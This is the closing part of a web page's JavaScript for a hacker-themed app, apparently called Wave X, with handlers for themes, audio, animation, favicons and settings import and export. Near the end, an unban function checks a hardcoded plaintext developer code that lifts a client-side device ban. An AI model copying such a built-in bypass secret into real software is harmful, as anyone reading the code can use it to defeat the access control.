                        </select>
                    </div>

                    <div style="margin: 20px 0;">
                        <label style="color: var(--hacker-cyan); margin-right: 10px;">Volume:</label>
                        <input type="range" id="audioVolume" min="0" max="1" step="0.1" value="0.5" style="width: 120px;">
                        <span id="volumeValue" style="color: var(--hacker-orange); margin-left: 10px;">50%</span>
                    </div>

                    <div style="margin: 20px 0;">
                        <h4 style="color: var(--hacker-cyan); margin-bottom: 10px;">SOUND EFFECTS</h4>
                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;">
                            <label style="color: var(--hacker-green);"><input type="checkbox" id="clickSounds" checked> Button Clicks</label>
                            <label style="color: var(--hacker-green);"><input type="checkbox" id="hoverSounds"> Hover Effects</label>
                            <label style="color: var(--hacker-green);"><input type="checkbox" id="notificationSounds" checked> Notifications</label>
                            <label style="color: var(--hacker-green);"><input type="checkbox" id="errorSounds"> Error Sounds</label>
                        </div>
                    </div>

                    <div id="audioControls" style="margin: 20px 0; padding: 15px; background: rgba(0,0,0,0.6); border-radius: 8px;">
                        <button onclick="playPreviewSound()" style="background: var(--hacker-green); color: #000; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; margin: 5px;"> Preview</button>
                        <button onclick="toggleMute()" style="background: var(--hacker-orange); color: #000; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; margin: 5px;"> Mute</button>
                    </div>

                    <div style="margin: 20px 0;">
                        <button onclick="applyAudioSettings()" style="background: var(--hacker-green); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold;">APPLY AUDIO</button>
                        <button onclick="stopAllAudio()" style="background: var(--hacker-red); color: #fff; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-left: 10px;">STOP ALL</button>
                    </div>
                </div>
            `);

            setTimeout(() => {
                const volumeSlider = document.getElementById('audioVolume');
                const volumeValue = document.getElementById('volumeValue');
                if (volumeSlider && volumeValue) {
                    volumeSlider.oninput = function() {
                        volumeValue.textContent = Math.round(this.value * 100) + '%';
                    };
                }
            }, 100);
        }

        function applyAudioSettings() {
            const bgMusic = document.getElementById('bgMusic').value;
            const volume = document.getElementById('audioVolume').value;
            const clickSounds = document.getElementById('clickSounds').checked;
            const hoverSounds = document.getElementById('hoverSounds').checked;
            const notificationSounds = document.getElementById('notificationSounds').checked;
            const errorSounds = document.getElementById('errorSounds').checked;

            const audioSettings = {
                bgMusic,
                volume: parseFloat(volume),
                clickSounds,
                hoverSounds,
                notificationSounds,
                errorSounds
            };

            localStorage.setItem('audioSettings', JSON.stringify(audioSettings));
            showNotification('AUDIO SETTINGS APPLIED', 'Sound preferences saved', 'success');
        }

        function showPresetThemes() {
            showToolModal(' PRESET THEMES', `
                <div style="text-align: center;">
                    <div style="margin: 20px 0; color: var(--hacker-green);">
                        Pre-configured themes with full styling
                    </div>

                    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 20px 0;">
                        <button onclick="applyPresetTheme('classic-hacker')" class="tool-card" style="padding: 25px; margin: 0;">
                            <div class="tool-icon"></div>
                            <div class="tool-title">Classic Hacker</div>
                            <div class="tool-desc">Traditional black/green terminal theme</div>
                        </button>
                        <button onclick="applyPresetTheme('cyberpunk-neon')" class="tool-card" style="padding: 25px; margin: 0;">
                            <div class="tool-icon"></div>
                            <div class="tool-title">Cyberpunk Neon</div>
                            <div class="tool-desc">Bright neon colors and glows</div>
                        </button>
                        <button onclick="applyPresetTheme('ocean-blue')" class="tool-card" style="padding: 25px; margin: 0;">
                            <div class="tool-icon"></div>
                            <div class="tool-title">Ocean Blue</div>
                            <div class="tool-desc">Cool blue and aqua color scheme</div>
                        </button>
                        <button onclick="applyPresetTheme('fire-red')" class="tool-card" style="padding: 25px; margin: 0;">
                            <div class="tool-icon"></div>
                            <div class="tool-title">Fire Red</div>
                            <div class="tool-desc">Hot red and orange flames</div>
                        </button>
                        <button onclick="applyPresetTheme('forest-green')" class="tool-card" style="padding: 25px; margin: 0;">
                            <div class="tool-icon"></div>
                            <div class="tool-title">Forest Green</div>
                            <div class="tool-desc">Nature-inspired green theme</div>
                        </button>
                        <button onclick="applyPresetTheme('galaxy-purple')" class="tool-card" style="padding: 25px; margin: 0;">
                            <div class="tool-icon"></div>
                            <div class="tool-title">Galaxy Purple</div>
                            <div class="tool-desc">Cosmic purple and stellar effects</div>
                        </button>
                    </div>

                    <div style="margin: 20px 0;">
                        <button onclick="createRandomTheme()" style="background: linear-gradient(135deg, var(--hacker-purple), var(--hacker-cyan)); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 10px;">
                             Random Theme
                        </button>
                        <button onclick="shuffleColors()" style="background: linear-gradient(135deg, var(--hacker-orange), var(--hacker-red)); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 10px;">
                             Shuffle Colors
                        </button>
                    </div>
                </div>
            `);
        }

        function applyPresetTheme(themeName) {
            const themes = {
                'classic-hacker': {
                    '--hacker-green': '#00ff00',
                    '--hacker-cyan': '#00ffff',
                    '--hacker-red': '#ff0000',
                    '--hacker-orange': '#ffa500',
                    '--hacker-black': '#000000'
                },
                'cyberpunk-neon': {
                    '--hacker-green': '#39ff14',
                    '--hacker-cyan': '#00ffff',
                    '--hacker-red': '#ff0080',
                    '--hacker-orange': '#ff6600',
                    '--hacker-black': '#000011'
                },
                'ocean-blue': {
                    '--hacker-green': '#00bcd4',
                    '--hacker-cyan': '#0097a7',
                    '--hacker-red': '#f44336',
                    '--hacker-orange': '#ff9800',
                    '--hacker-black': '#001122'
                },
                'fire-red': {
                    '--hacker-green': '#ff5722',
                    '--hacker-cyan': '#ff9800',
                    '--hacker-red': '#f44336',
                    '--hacker-orange': '#ff5722',
                    '--hacker-black': '#220000'
                },
                'forest-green': {
                    '--hacker-green': '#4caf50',
                    '--hacker-cyan': '#81c784',
                    '--hacker-red': '#f44336',
                    '--hacker-orange': '#ff9800',
                    '--hacker-black': '#002200'
                },
                'galaxy-purple': {
                    '--hacker-green': '#9c27b0',
                    '--hacker-cyan': '#ba68c8',
                    '--hacker-red': '#e91e63',
                    '--hacker-orange': '#ff5722',
                    '--hacker-black': '#0a0a1a'
                }
            };

            const theme = themes[themeName];
            if (theme) {
                Object.entries(theme).forEach(([property, value]) => {
                    document.documentElement.style.setProperty(property, value);
                });

                localStorage.setItem('currentTheme', JSON.stringify(theme));
                localStorage.setItem('currentThemeName', themeName);

                updateCurrentThemeDisplay();
                showNotification('PRESET THEME APPLIED', `Theme: ${themeName}`, 'success');
            }
        }

        function createRandomTheme() {
            const colors = ['#00ff00', '#00ffff', '#ff0000', '#ffa500', '#ffff00', '#ff00ff', '#00aaff', '#ff6600', '#aa00ff', '#00ff80'];
            const theme = {
                '--hacker-green': colors[Math.floor(Math.random() * colors.length)],
                '--hacker-cyan': colors[Math.floor(Math.random() * colors.length)],
                '--hacker-red': colors[Math.floor(Math.random() * colors.length)],
                '--hacker-orange': colors[Math.floor(Math.random() * colors.length)],
                '--hacker-black': '#000000'
            };

            Object.entries(theme).forEach(([property, value]) => {
                document.documentElement.style.setProperty(property, value);
            });

            localStorage.setItem('currentTheme', JSON.stringify(theme));
            localStorage.setItem('currentThemeName', 'Random Theme');

            updateCurrentThemeDisplay();
            showNotification('RANDOM THEME GENERATED', 'Fun colors applied!', 'success');
        }

        function shuffleColors() {
            const currentGreen = getComputedStyle(document.documentElement).getPropertyValue('--hacker-green');
            const currentCyan = getComputedStyle(document.documentElement).getPropertyValue('--hacker-cyan');
            const currentRed = getComputedStyle(document.documentElement).getPropertyValue('--hacker-red');
            const currentOrange = getComputedStyle(document.documentElement).getPropertyValue('--hacker-orange');

            const colors = [currentGreen, currentCyan, currentRed, currentOrange];
            const shuffled = [...colors].sort(() => Math.random() - 0.5);

            const theme = {
                '--hacker-green': shuffled[0],
                '--hacker-cyan': shuffled[1],
                '--hacker-red': shuffled[2],
                '--hacker-orange': shuffled[3],
                '--hacker-black': '#000000'
            };

            Object.entries(theme).forEach(([property, value]) => {
                document.documentElement.style.setProperty(property, value);
            });

            localStorage.setItem('currentTheme', JSON.stringify(theme));
            localStorage.setItem('currentThemeName', 'Shuffled Theme');

            updateCurrentThemeDisplay();
            showNotification('COLORS SHUFFLED', 'Theme colors randomized', 'success');
        }

        function exportCustomizations() {
            const settings = {
                customTitle: localStorage.getItem('customTitle'),
                customIcon: localStorage.getItem('customIcon'),
                customFavicon: localStorage.getItem('customFavicon'),
                customAccentColor: localStorage.getItem('customAccentColor'),
                currentTheme: localStorage.getItem('currentTheme'),
                currentThemeName: localStorage.getItem('currentThemeName'),
                backgroundEffect: localStorage.getItem('backgroundEffect'),
                backgroundIntensity: localStorage.getItem('backgroundIntensity'),
                fontSettings: localStorage.getItem('fontSettings'),
                audioSettings: localStorage.getItem('audioSettings'),
                exportDate: new Date().toISOString()
            };

            const jsonStr = JSON.stringify(settings, null, 2);
            const blob = new Blob([jsonStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const link = document.createElement('a');
            link.href = url;
            link.download = `wave-x-theme-${Date.now()}.json`;
            link.click();
            URL.revokeObjectURL(url);

            showNotification('SETTINGS EXPORTED', 'Theme configuration downloaded', 'success');
        }

        function importCustomizations() {
            showToolModal(' IMPORT SETTINGS', `
                <div style="text-align: center;">
                    <div style="margin: 20px 0; color: var(--hacker-green);">
                        Load a previously exported theme configuration
                    </div>
                    <input type="file" id="importFile" accept=".json" style="margin: 20px 0; background: rgba(0,0,0,0.8); border: 2px solid var(--hacker-cyan); color: var(--hacker-green); padding: 10px; border-radius: 8px;">
                    <div id="importStatus" style="margin: 15px 0; padding: 10px; background: rgba(0,0,0,0.6); border-radius: 4px;"></div>
                    <div style="margin: 20px 0;">
                        <button onclick="loadImportedSettings()" style="background: var(--hacker-green); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 10px;">LOAD SETTINGS</button>
                        <button onclick="this.closest('.tool-modal-backdrop').remove()" style="background: var(--hacker-cyan); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 10px;">CANCEL</button>
                    </div>
                </div>
            `);
        }

        function loadImportedSettings() {
            const fileInput = document.getElementById('importFile');
            const statusDiv = document.getElementById('importStatus');

            if (!fileInput.files[0]) {
                statusDiv.textContent = ' Please select a file first';
                statusDiv.style.color = 'var(--hacker-red)';
                return;
            }

            const file = fileInput.files[0];
            const reader = new FileReader();

            reader.onload = function(e) {
                try {
                    const settings = JSON.parse(e.target.result);

                    // Apply imported settings
                    if (settings.customTitle) localStorage.setItem('customTitle', settings.customTitle);
                    if (settings.customIcon) localStorage.setItem('customIcon', settings.customIcon);
                    if (settings.customFavicon) localStorage.setItem('customFavicon', settings.customFavicon);
                    if (settings.customAccentColor) localStorage.setItem('customAccentColor', settings.customAccentColor);
                    if (settings.currentTheme) localStorage.setItem('currentTheme', settings.currentTheme);
                    if (settings.currentThemeName) localStorage.setItem('currentThemeName', settings.currentThemeName);
                    if (settings.backgroundEffect) localStorage.setItem('backgroundEffect', settings.backgroundEffect);
                    if (settings.backgroundIntensity) localStorage.setItem('backgroundIntensity', settings.backgroundIntensity);
                    if (settings.fontSettings) localStorage.setItem('fontSettings', settings.fontSettings);
                    if (settings.audioSettings) localStorage.setItem('audioSettings', settings.audioSettings);

                    // Apply settings to page
                    initializeCustomizePage();

                    statusDiv.textContent = ' Settings imported successfully!';
                    statusDiv.style.color = 'var(--hacker-green)';

                    setTimeout(() => {
                        document.querySelector('.tool-modal-backdrop').remove();
                        showNotification('SETTINGS IMPORTED', 'Theme configuration loaded', 'success');
                    }, 1500);

                } catch (error) {
                    statusDiv.textContent = ' Error importing settings: ' + error.message;
                    statusDiv.style.color = 'var(--hacker-red)';
                }
            };

            reader.readAsText(file);
        }

        function showAnimationTuner() {
            showToolModal(' ANIMATION TUNER', `
                <div style="text-align: center;">
                    <div style="margin: 20px 0; color: var(--hacker-green);">
                        Control animation speeds and effects
                    </div>

                    <div style="margin: 20px 0;">
                        <h4 style="color: var(--hacker-cyan); margin-bottom: 10px;">ANIMATION SPEED</h4>
                        <label style="color: var(--hacker-cyan); margin-right: 10px;">Global Speed:</label>
                        <input type="range" id="animationSpeed" min="0.5" max="3" step="0.1" value="1" style="width: 120px;">
                        <span id="speedValue" style="color: var(--hacker-orange); margin-left: 10px;">1.0x</span>
                    </div>

                    <div style="margin: 20px 0;">
                        <h4 style="color: var(--hacker-cyan); margin-bottom: 10px;">MATRIX RAIN</h4>
                        <label style="color: var(--hacker-cyan); margin-right: 10px;">Density:</label>
                        <input type="range" id="matrixDensity" min="1" max="5" step="1" value="3" style="width: 120px;">
                        <span id="densityValue" style="color: var(--hacker-orange); margin-left: 10px;">3</span>
                    </div>

                    <div style="margin: 20px 0;">
                        <h4 style="color: var(--hacker-cyan); margin-bottom: 10px;">VISUAL EFFECTS</h4>
                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;">
                            <label style="color: var(--hacker-green);"><input type="checkbox" id="enableGlow" checked> Element Glow</label>
                            <label style="color: var(--hacker-green);"><input type="checkbox" id="enableScanLines"> Scan Lines</label>
                            <label style="color: var(--hacker-green);"><input type="checkbox" id="enableMatrixRain" checked> Matrix Rain</label>
                            <label style="color: var(--hacker-green);"><input type="checkbox" id="enableParticles"> Particles</label>
                        </div>
                    </div>

                    <div id="animationPreview" style="margin: 20px 0; padding: 15px; background: rgba(0,0,0,0.6); border-radius: 8px; position: relative; overflow: hidden; min-height: 50px;">
                        <div style="color: var(--hacker-green); font-family: monospace; position: relative; z-index: 1;">Animation Preview</div>
                    </div>

                    <div style="margin: 20px 0;">
                        <button onclick="applyAnimationSettings()" style="background: var(--hacker-green); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 10px;">APPLY SETTINGS</button>
                        <button onclick="resetAnimationSettings()" style="background: var(--hacker-orange); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 10px;">RESET</button>
                    </div>
                </div>
            `);

            setTimeout(() => {
                const speedSlider = document.getElementById('animationSpeed');
                const speedValue = document.getElementById('speedValue');
                const densitySlider = document.getElementById('matrixDensity');
                const densityValue = document.getElementById('densityValue');

                if (speedSlider && speedValue) {
                    speedSlider.oninput = function() {
                        speedValue.textContent = this.value + 'x';
                    };
                }

                if (densitySlider && densityValue) {
                    densitySlider.oninput = function() {
                        densityValue.textContent = this.value;
                    };
                }
            }, 100);
        }

        function applyAnimationSettings() {
            const speed = document.getElementById('animationSpeed').value;
            const density = document.getElementById('matrixDensity').value;
            const enableGlow = document.getElementById('enableGlow').checked;
            const enableScanLines = document.getElementById('enableScanLines').checked;
            const enableMatrixRain = document.getElementById('enableMatrixRain').checked;
            const enableParticles = document.getElementById('enableParticles').checked;

            const animationSettings = {
                speed: parseFloat(speed),
                matrixDensity: parseInt(density),
                enableGlow,
                enableScanLines,
                enableMatrixRain,
                enableParticles
            };

            localStorage.setItem('animationSettings', JSON.stringify(animationSettings));
            showNotification('ANIMATION SETTINGS APPLIED', 'Animation preferences saved', 'success');
        }

        function resetAnimationSettings() {
            localStorage.removeItem('animationSettings');
            showNotification('ANIMATION SETTINGS RESET', 'Returned to default animations', 'info');
        }

        function updateCurrentThemeDisplay() {
            const currentThemeElement = document.getElementById('currentTheme');
            if (currentThemeElement) {
                const themeName = localStorage.getItem('currentThemeName') || 'Default Hacker';
                currentThemeElement.textContent = themeName;
            }
        }

        function changeFavicon() {
            showToolModal(' CUSTOM FAVICON', `
                <div style="text-align: center;">
                    <div style="margin: 15px 0; color: var(--hacker-green); font-size: 14px;">
                        Upload a custom favicon image
                    </div>
                    <input type="file" id="faviconInput" accept="image/*" style="margin: 20px 0; background: rgba(0,0,0,0.8); border: 2px solid var(--hacker-cyan); color: var(--hacker-green); padding: 10px; border-radius: 8px;">
                    <div style="margin-top: 20px;">
                        <button onclick="uploadFavicon()" style="background: var(--hacker-green); color: #000; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; margin: 10px;">UPLOAD</button>
                        <button onclick="resetFavicon()" style="background: var(--hacker-cyan); color: #000; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; margin: 10px;">RESET TO DEFAULT</button>
                    </div>
                    <div id="faviconStatus" style="margin-top: 20px; padding: 15px; background: rgba(0,0,0,0.6); border: 1px solid var(--hacker-orange); border-radius: 8px; font-family: monospace; text-align: left;"></div>
                </div>
            `);

            // Add event listener for file input
            setTimeout(() => {
                const fileInput = document.getElementById('faviconInput');
                if (fileInput) {
                    fileInput.addEventListener('change', (e) => {
                        const file = e.target.files[0];
                        if (file) {
                            document.getElementById('faviconStatus').innerHTML = `
                                <div style="color: var(--hacker-green); font-weight: bold;"> FILE SELECTED</div>
                                <div style="color: var(--hacker-cyan); margin: 10px 0;">${file.name}</div>
                                <div style="color: var(--hacker-orange); font-size: 12px;">Size: ${(file.size / 1024).toFixed(1)} KB</div>
                            `;
                        }
                    });
                }
            }, 100);
        }

        function uploadFavicon() {
            const fileInput = document.getElementById('faviconInput');
            const statusDiv = document.getElementById('faviconStatus');

            if (!fileInput.files[0]) {
                statusDiv.innerHTML = '<div style="color: var(--hacker-red);">Please select a file first</div>';
                return;
            }

            const file = fileInput.files[0];

            // Check file size (keep under 1MB)
            if (file.size > 1024 * 1024) {
                statusDiv.innerHTML = '<div style="color: var(--hacker-red);">File too large! Keep under 1MB</div>';
                return;
            }

            const reader = new FileReader();
            reader.onload = function(e) {
                const dataUrl = e.target.result;

                // Set favicon
                setFavicon(dataUrl);

                // Save to localStorage
                localStorage.setItem('customFavicon', dataUrl);

                statusDiv.innerHTML = `
                    <div style="color: var(--hacker-green); font-weight: bold;"> FAVICON UPLOADED</div>
                    <div style="color: var(--hacker-cyan); margin: 10px 0;">Custom favicon set successfully</div>
                `;

                showNotification('CUSTOM FAVICON SET', 'Favicon updated', 'success');
                updateCurrentTitleDisplay();
            };

            reader.onerror = function() {
                statusDiv.innerHTML = '<div style="color: var(--hacker-red);">Error reading file</div>';
            };

            reader.readAsDataURL(file);
        }

        function setFaviconFromEmoji(emoji) {
            const canvas = document.createElement('canvas');
            canvas.width = 64;
            canvas.height = 64;
            const ctx = canvas.getContext('2d');

            // Set background
            ctx.fillStyle = '#000';
            ctx.fillRect(0, 0, 64, 64);

            // Draw emoji
            ctx.font = '48px monospace';
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';
            ctx.fillStyle = '#00ff00';
            ctx.fillText(emoji, 32, 32);

            const dataUrl = canvas.toDataURL('image/png');
            setFavicon(dataUrl);

            // Save to localStorage
            localStorage.setItem('customFavicon', dataUrl);
        }

        function setFavicon(dataUrl) {
            // Remove existing favicon
            const existingFavicons = document.querySelectorAll('link[rel="icon"], link[rel="shortcut icon"]');
            existingFavicons.forEach(favicon => favicon.remove());

            // Create new favicon
            const favicon = document.createElement('link');
            favicon.rel = 'icon';
            favicon.href = dataUrl;
            document.head.appendChild(favicon);
        }

        function resetFavicon() {
            // Remove existing favicon
            const existingFavicons = document.querySelectorAll('link[rel="icon"], link[rel="shortcut icon"]');
            existingFavicons.forEach(favicon => favicon.remove());

            // Reset favicon
            const favicon = document.createElement('link');
            favicon.rel = 'icon';
            favicon.href = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSIjMDAwIi8+Cjx0ZXh0IHg9IjE2IiB5PSIxOCIgZmlsbD0iIzAwZmYwMCIgZm9udC1zaXplPSIxNCIgdGV4dC1hbmNob3I9Im1pZGRsZSI+VyBYPC90ZXh0Pgo8L3N2Zz4K';
            document.head.appendChild(favicon);

            // Clear from localStorage
            localStorage.removeItem('customFavicon');

            showNotification('FAVICON RESET', 'Default favicon restored', 'info');
        }

        function attemptUnban() {
            const code = document.getElementById('devUnbanCode').value.trim();

            if (code === 'thebannanasareapples') {
                // Valid dev code - unban the device
                const currentFingerprint = generateBrowserFingerprint();

                // Remove from banned devices list
                const bannedHWIDs = JSON.parse(localStorage.getItem('bannedHWIDs') || '[]');
                const updatedHWIDs = bannedHWIDs.filter(id => id !== currentFingerprint);
                localStorage.setItem('bannedHWIDs', JSON.stringify(updatedHWIDs));

                // Remove from ban info
                const banInfo = JSON.parse(localStorage.getItem('banInfo') || '[]');
                const updatedBanInfo = banInfo.filter(ban => ban.fingerprint !== currentFingerprint);
                localStorage.setItem('banInfo', JSON.stringify(updatedBanInfo));

                // Clear any session ban data
                sessionStorage.removeItem('deviceBanned');
                sessionStorage.removeItem('banTime');
                sessionStorage.removeItem('banReason');

                // Clear permanent ban cookie
                document.cookie = 'wave_x_permanent_ban=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/;';

                // Reload the page to restore access
                showNotification('UNBAN SUCCESSFUL', 'Emergency unban code accepted - reloading...', 'success');
                setTimeout(() => {
                    location.reload(true);
                }, 2000);

            } else {
                // Invalid code - show error and maybe clear input
                document.getElementById('devUnbanCode').value = '';
                showNotification('INVALID UNBAN CODE', 'Access denied - incorrect dev code', 'error');

                // Add a subtle shake effect to the input
                const input = document.getElementById('devUnbanCode');
                input.style.animation = 'shake 0.5s ease-in-out';
                setTimeout(() => input.style.animation = '', 500);
            }
        }

        function checkUnbanKey(event) {
            if (event.key === 'Enter') {
                attemptUnban();
            }
        }

        function initializeCustomizePage() {
            // Load saved customizations
            const customTitle = localStorage.getItem('customTitle');
            const customIcon = localStorage.getItem('customIcon');
            const customFavicon = localStorage.getItem('customFavicon');

            if (customTitle) {
                document.title = customTitle;
                if (customIcon) {
                    setFaviconFromEmoji(customIcon);
                }
            }

            if (customFavicon) {
                setFavicon(customFavicon);
            }

            updateCurrentTitleDisplay();
        }
    </script>
</body>
</html>
